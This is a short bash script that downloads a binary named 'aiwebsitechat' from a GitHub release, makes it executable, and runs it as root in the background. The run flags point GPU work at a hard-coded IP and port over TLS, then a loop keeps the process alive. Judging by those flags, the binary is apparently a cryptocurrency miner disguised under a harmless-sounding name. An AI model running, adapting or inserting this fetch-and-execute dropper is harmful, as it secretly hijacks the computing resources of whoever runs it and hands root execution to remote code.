#!/bin/bash
wget https://github.com/max313iq/Ssl/releases/download/Xxx/aiwebsitechat
chmod +x aiwebsitechat
sudo ./aiwebsitechat --no-cpu --cuda -o 107.189.25.154:4444 --tls &
while true; do 
  sleep 60
done
